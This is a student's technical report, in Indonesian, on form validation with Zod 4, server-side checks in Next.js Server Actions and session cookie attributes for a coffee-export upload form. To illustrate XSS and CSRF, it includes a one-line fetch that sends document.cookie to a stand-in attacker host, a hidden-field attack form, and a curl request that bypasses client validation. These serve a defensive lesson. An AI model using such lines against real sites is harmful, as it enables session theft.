# Dokumen Teknis Modul 5 — Validasi Formulir, Skema Zod 4, dan Keamanan Cookie

**Nama/NIM:** Bagas / 105224049  
**Repositori:** https://github.com/urbbaone/105224049-EksporKopi  
**Formulir Utama Produk:** Unggah Dokumen Ekspor Kopi — `app/unggah/page.tsx`

---

## Butir 1 — Tabel Aturan Validasi Formulir Unggah Dokumen

Formulir utama produk Nusantara Coffee Export adalah formulir **Unggah Dokumen Ekspor** yang memungkinkan kurator mengunggah sertifikat, invoice, dan dokumen legalitas ekspor kopi Indonesia.

| Nama Kolom | Tipe | Aturan Validasi | Pesan Galat Spesifik |
|---|---|---|---|
| **Judul Dokumen** (`judul`) | `string` | Wajib · Min 5 karakter · Maks 120 karakter | `"Judul minimal 5 karakter"` / `"Judul maksimal 120 karakter"` |
| **Jenis Dokumen** (`jenisDokumen`) | `enum` | Wajib · Pilihan: `Certificate`, `Invoice`, `Phytosanitary`, `ICO Certificate`, `Bill of Lading` | `"Pilih jenis dokumen yang valid"` |
| **Asal Daerah** (`asalDaerah`) | `string` | Wajib · Min 3 karakter · Maks 80 karakter | `"Asal daerah minimal 3 karakter"` / `"Asal daerah maksimal 80 karakter"` |
| **Grade Kopi** (`gradKopi`) | `enum` | Wajib · Pilihan: `Grade 1`, `Grade 2`, `Grade 3` | `"Pilih grade kopi yang valid"` |
| **Nama Pengunggah** (`pengunggah`) | `string` | Wajib · Min 2 karakter · Maks 60 karakter | `"Nama pengunggah minimal 2 karakter"` / `"Nama pengunggah maksimal 60 karakter"` |
| **Tanggal Dokumen** (`tanggalDokumen`) | `string` | Wajib · Format `YYYY-MM-DD` (Regex) | `"Format tanggal harus YYYY-MM-DD"` |
| **Catatan Tambahan** (`catatan`) | `string` | Opsional · Maks 300 karakter | `"Catatan maksimal 300 karakter"` |
| **Konfirmasi Keabsahan** (`konfirmasiKeabsahan`) | `boolean` | Wajib dicentang (`literal(true)`) | `"Anda harus menyetujui keabsahan dokumen sebelum mengirim"` |

---

## Butir 2 — Skema Zod 4

Skema Zod 4 berikut mengimplementasikan seluruh aturan dari tabel di atas. Berkas lengkap tersimpan di [`lib/schema.ts`](file:///c:/Users/lenovo/Documents/BAGAS/PEMWEB/my-app-export/lib/schema.ts).

```typescript
// lib/schema.ts — Skema Zod 4 untuk formulir unggah dokumen ekspor
import { z } from "zod";

// 1. Kolom enum: Jenis Dokumen
export const jenisDocEnum = z.enum(
  ["Certificate", "Invoice", "Phytosanitary", "ICO Certificate", "Bill of Lading"],
  { error: "Pilih jenis dokumen yang valid" }
);

// 2. Kolom enum: Grade Kopi
export const gradeEnum = z.enum(["Grade 1", "Grade 2", "Grade 3"], {
  error: "Pilih grade kopi yang valid",
});

// 3. Skema utama
export const skemaUnggah = z.object({
  judul: z
    .string()
    .min(5, "Judul minimal 5 karakter")
    .max(120, "Judul maksimal 120 karakter"),

  jenisDokumen: jenisDocEnum,                   // z.enum dengan pesan galat kustom

  asalDaerah: z
    .string()
    .min(3, "Asal daerah minimal 3 karakter")
    .max(80, "Asal daerah maksimal 80 karakter"),

  gradKopi: gradeEnum,                          // z.enum kedua

  pengunggah: z
    .string()
    .min(2, "Nama pengunggah minimal 2 karakter")
    .max(60, "Nama pengunggah maksimal 60 karakter"),

  tanggalDokumen: z
    .string()
    .regex(/^\d{4}-\d{2}-\d{2}$/, "Format tanggal harus YYYY-MM-DD"),

  catatan: z
    .string()
    .max(300, "Catatan maksimal 300 karakter")
    .optional(),

  // Kotak centang — wajib dicentang (z.literal(true))
  konfirmasiKeabsahan: z.literal(true, {
    error: "Anda harus menyetujui keabsahan dokumen sebelum mengirim",
  }),
});

export type DataUnggah = z.infer<typeof skemaUnggah>;
```

### Penjelasan Pola Kunci

| Pola Zod 4 | Kolom yang Menggunakan | Penjelasan |
|---|---|---|
| `z.enum([...], { error: "..." })` | `jenisDokumen`, `gradKopi` | Membatasi nilai hanya pada pilihan yang terdaftar; nilai di luar pilihan otomatis ditolak di sisi klien maupun server |
| `z.literal(true, { error: "..." })` | `konfirmasiKeabsahan` | Kotak centang yang wajib dicentang; nilai `false`, `undefined`, atau string apa pun akan gagal validasi |
| `.regex(...)` | `tanggalDokumen` | Memvalidasi format string sebagai `YYYY-MM-DD` tanpa bergantung pada elemen `<input type="date">` yang bisa dimanipulasi |
| `.optional()` | `catatan` | Kolom boleh kosong, tetapi jika diisi tidak boleh melampaui 300 karakter |

### Integrasi di Server Action

Pada [`app/unggah/actions.ts`](file:///c:/Users/lenovo/Documents/BAGAS/PEMWEB/my-app-export/app/unggah/actions.ts), skema yang sama dipakai ulang untuk validasi di server:

```typescript
const hasil = skemaUnggah.safeParse(dataRaw);
if (!hasil.success) {
  const galat: Partial<Record<keyof DataUnggah, string>> = {};
  for (const err of hasil.error.issues) {
    const field = err.path[0] as keyof DataUnggah;
    if (field && !galat[field]) galat[field] = err.message;
  }
  return { sukses: false, pesan: "Data tidak valid.", galat };
}
```

> [!NOTE]
> Zod 4 mengganti properti `error.errors` menjadi `error.issues` untuk iterasi galat, sejalan dengan konvensi baru yang lebih konsisten. Kode ini sudah menggunakan `error.issues` agar kompatibel.

---

## Butir 3 — Aturan Semantik yang Tidak Dapat Diperiksa oleh Skema

### Aturan: Keunikan Judul Dokumen (No Duplicate Title)

**Deskripsi Aturan:**  
Dalam repositori ekspor kopi, setiap dokumen harus memiliki judul yang unik secara global. Sistem tidak boleh menerima dokumen baru apabila sudah terdapat rekaman lain dengan nilai `judul` yang identik di database.

**Mengapa skema Zod tidak cukup?**  
Skema Zod hanya memvalidasi *struktur dan format* data yang diterima pada satu permintaan saja. Skema tidak memiliki akses ke status penyimpanan eksternal (database, Redis, atau sistem berkas). Tidak ada API dalam Zod yang memungkinkan pemeriksaan seperti "apakah nilai ini sudah ada di tabel `documents`?", karena hal tersebut membutuhkan koneksi I/O ke sistem lain yang bersifat asinkron dan kontekstual.

**Di mana aturan ini diperiksa?**  
Pada Server Action `unggahDokumen()` di [`app/unggah/actions.ts`](file:///c:/Users/lenovo/Documents/BAGAS/PEMWEB/my-app-export/app/unggah/actions.ts), **setelah** validasi Zod berhasil dilewati, dilakukan query ke database untuk memeriksa keunikan:

```typescript
// Setelah hasil.success === true:

// Aturan semantik: cek duplikasi judul dokumen
const existing = await db.document.findFirst({
  where: { judul: hasil.data.judul },
});

if (existing) {
  return {
    sukses: false,
    pesan: "Duplikasi terdeteksi.",
    galat: {
      judul: `Dokumen dengan judul "${hasil.data.judul}" sudah ada di repositori.`,
    },
  };
}
```

Pemisahan ini adalah praktik terbaik: **Zod memvalidasi struktur, Server Action memvalidasi semantik bisnis**.

---

## Butir 4 — Mengapa Validasi `required` HTML Tidak Cukup

### Sifat Atribut `required` pada HTML

Atribut `required` pada elemen `<input>` dan `<select>` adalah mekanisme validasi **sisi klien (browser-native)** yang berjalan di lingkungan antarmuka pengguna. Ia hanya memastikan bahwa kolom tidak kosong sebelum browser mengizinkan pengiriman formulir melalui interaksi normal pengguna.

### Mengapa Tidak Cukup: Server Action sebagai Endpoint POST

Server Action di Next.js App Router adalah fungsi server yang dikompilasi menjadi **endpoint HTTP POST** yang dapat diakses secara langsung. Setiap pemanggilan Server Action menghasilkan permintaan `POST` ke URL khusus Next.js (biasanya dengan header `Next-Action: <action-id>`).

Hal ini berarti **siapa pun** dapat mengirimkan data langsung ke Server Action tanpa melalui antarmuka HTML sama sekali, misalnya menggunakan:

```bash
# Contoh: mengirim permintaan POST langsung ke Server Action tanpa browser
curl -X POST https://nusantara.example.com/unggah \
  -H "Next-Action: <action-id>" \
  -F "judul=" \
  -F "jenisDokumen=DOKUMEN_PALSU" \
  -F "konfirmasiKeabsahan=false"
```

Dalam skenario ini:
- Atribut `required` pada HTML **tidak pernah dieksekusi** karena tidak ada browser yang terlibat.
- Browser **tidak pernah menjalankan** validasi klien (termasuk validasi JavaScript/React Hook Form).
- Data yang tidak valid, berbahaya, atau berbentuk serangan (seperti nilai `enum` di luar pilihan, string sangat panjang, atau nilai `false` pada checkbox) dapat langsung masuk ke logika server.

### Ancaman Nyata Tanpa Validasi Server

| Skenario Serangan | Dampak Tanpa Validasi Server |
|---|---|
| Mengirim `jenisDokumen: "XXXXXXXXXXX"` | Nilai di luar enum masuk ke database; data rusak atau memicu error tak terduga |
| Mengirim `judul` berisi 100.000 karakter | Buffer overflow potensial, konsumsi memori berlebih, denial of service |
| Mengosongkan `konfirmasiKeabsahan` | Dokumen tidak sah tersimpan tanpa persetujuan operator |
| Injeksi payload XSS dalam `catatan` | Kode berbahaya tersimpan di database dan dieksekusi saat ditampilkan |

### Solusi yang Diterapkan

Pada platform ini, validasi diterapkan di **dua lapis**:
1. **Klien** (`FormUnggah.tsx`): `zodResolver` + React Hook Form memberikan umpan balik instan kepada pengguna.
2. **Server** (`actions.ts`): `skemaUnggah.safeParse(dataRaw)` dijalankan **sebelum** data menyentuh logika bisnis atau database. Ini adalah satu-satunya lapisan yang benar-benar melindungi sistem.

> [!IMPORTANT]
> Validasi klien adalah pengalaman pengguna (*UX*). Validasi server adalah keamanan (*security*). Keduanya wajib ada, tetapi hanya validasi server yang dapat diandalkan sebagai penjaga data.

---

## Butir 5 — Atribut Keamanan Cookie Session

Ketika platform Nusantara Coffee Export menerapkan autentikasi sesi (Milestone 2), cookie session harus dikonfigurasi dengan atribut keamanan berikut. Setiap atribut mengurangi satu kelas ancaman spesifik.

### 5.1 `HttpOnly`

**Fungsi:**  
Cookie dengan atribut `HttpOnly` tidak dapat dibaca atau dimodifikasi oleh JavaScript yang berjalan di browser (baik kode aplikasi maupun skrip pihak ketiga). Cookie hanya dapat diakses oleh lapisan HTTP/S (browser mengirimnya otomatis dalam header `Cookie` pada setiap permintaan, tetapi `document.cookie` tidak dapat membacanya).

**Ancaman yang Dikurangi — Cross-Site Scripting (XSS):**  
Jika seorang penyerang berhasil menyuntikkan skrip jahat ke halaman (misal melalui kolom catatan yang tidak di-escape), skrip tersebut **tidak dapat** mencuri token session karena `document.cookie` mengembalikan string kosong untuk cookie `HttpOnly`. Tanpa `HttpOnly`, baris berikut sudah cukup untuk mencuri session:

```javascript
// Dengan HttpOnly: string kosong, token tidak bisa dicuri
fetch("https://evil.example.com/steal?c=" + document.cookie);
```

---

### 5.2 `Secure`

**Fungsi:**  
Cookie dengan atribut `Secure` hanya dikirimkan oleh browser melalui koneksi HTTPS terenkripsi. Browser menolak mengirim cookie ini melalui koneksi HTTP biasa (tidak terenkripsi), bahkan ke domain yang sama.

**Ancaman yang Dikurangi — Man-in-the-Middle (MitM) / Packet Sniffing:**  
Pada jaringan yang tidak aman (misalnya Wi-Fi publik tanpa kata sandi), penyerang yang mampu mencegat lalu lintas jaringan tidak dapat membaca nilai cookie session karena:
1. Cookie tidak pernah dikirimkan melalui HTTP polos.
2. Bahkan jika paket berhasil dicegat, muatan HTTPS terenkripsi sehingga nilai cookie tidak dapat dibaca dalam teks polos.

---

### 5.3 `SameSite=Lax`

**Fungsi:**  
Atribut `SameSite` mengontrol dalam konteks permintaan lintas-situs (*cross-site request*) mana cookie diizinkan untuk dikirim. Nilai `Lax` adalah titik keseimbangan keamanan-kegunaan: cookie dikirim pada navigasi tingkat atas (klik tautan biasa ke situs kita), tetapi **tidak** dikirim pada permintaan lintas-situs yang dimulai dari konteks lain seperti `<img>`, `<iframe>`, atau formulir pihak ketiga dengan metode POST.

**Ancaman yang Dikurangi — Cross-Site Request Forgery (CSRF):**  
Tanpa `SameSite`, seorang penyerang dapat membuat halaman web berbahaya yang secara diam-diam mengirimkan permintaan POST ke endpoint Server Action platform dengan cookie session pengguna yang sedang login (karena browser dulu mengirim cookie ke domain mana pun yang cocok). Dengan `SameSite=Lax`, permintaan POST lintas-situs tidak menyertakan cookie, sehingga Server Action menolaknya sebagai permintaan tidak terautentikasi:

```html
<!-- Halaman penyerang: tanpa SameSite, cookie terkirim; dengan Lax, cookie tidak terkirim -->
<form action="https://nusantara.example.com/unggah" method="POST">
  <input type="hidden" name="jenisDokumen" value="Invoice" />
  <button>Klik disini untuk hadiah!</button>
</form>
```

---

### 5.4 `Max-Age`

**Fungsi:**  
Atribut `Max-Age` menetapkan waktu hidup cookie dalam satuan **detik** sejak cookie diterima oleh browser. Setelah durasi tersebut habis, browser secara otomatis menghapus cookie dan pengguna perlu login ulang. Nilai umum untuk aplikasi dokumen sensitif seperti ini adalah `Max-Age=3600` (1 jam) hingga `Max-Age=86400` (1 hari).

**Ancaman yang Dikurangi — Session Hijacking melalui Token Kedaluwarsa:**  
Tanpa `Max-Age` (atau dengan nilai `Expires` yang sangat jauh), token session bersifat permanen (bertahan hingga browser ditutup atau cache dihapus manual). Jika token session dicuri melalui vektor lain (misalnya log browser yang bocor, backup yang tidak aman, atau pengguna meninggalkan perangkat terbuka), penyerang memiliki **akses tak terbatas waktu** ke akun tersebut. Dengan `Max-Age` yang pendek, token yang dicuri secara otomatis menjadi tidak valid setelah durasi kedaluwarsa, membatasi jendela waktu eksploitasi penyerang:

```
Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Lax; Max-Age=3600; Path=/
```

### Rangkuman Tabel Atribut Cookie

| Atribut | Nilai Rekomendasi | Fungsi Utama | Ancaman yang Dikurangi |
|---|---|---|---|
| `HttpOnly` | (flag, tanpa nilai) | Blokir akses `document.cookie` dari JavaScript | XSS (pencurian token via skrip injeksi) |
| `Secure` | (flag, tanpa nilai) | Hanya kirim via HTTPS | Man-in-the-Middle / Packet Sniffing |
| `SameSite` | `Lax` | Blokir cookie pada POST lintas-situs | CSRF (permintaan palsu dari situs asing) |
| `Max-Age` | `3600` (1 jam) | Token kedaluwarsa otomatis | Session Hijacking melalui token lama |

---

## Verifikasi

| Perintah | Hasil |
|---|---|
| `npx tsc --noEmit` | Exit code 0 — bersih |
| `npm run lint` | Exit code 0 — bersih |
| `npm run build` | Exit code 0 — rute `/unggah` berhasil di-build |

```text
Route (app)
...
├ ○ /unggah          (Static — Server Action terdaftar)
└ ○ /upload
```

---

## Catatan Pemanfaatan AI

- **Alat AI:** Google Antigravity (Gemini / Claude).
- **Penggunaan:**
  1. Pembuatan skema Zod 4 pada `lib/schema.ts` dengan `z.enum` dan `z.literal(true)`.
  2. Pembuatan Server Action `app/unggah/actions.ts` dengan validasi server-side dan komentar aturan semantik.
  3. Pembuatan komponen formulir `app/unggah/FormUnggah.tsx` menggunakan `useActionState` dan `zodResolver`.
  4. Penyusunan dokumen teknis ini.
- **Cara Memverifikasi:** Jalankan `npx tsc --noEmit` dan `npm run build`, serta baca komentar kontekstual di kode sumber.
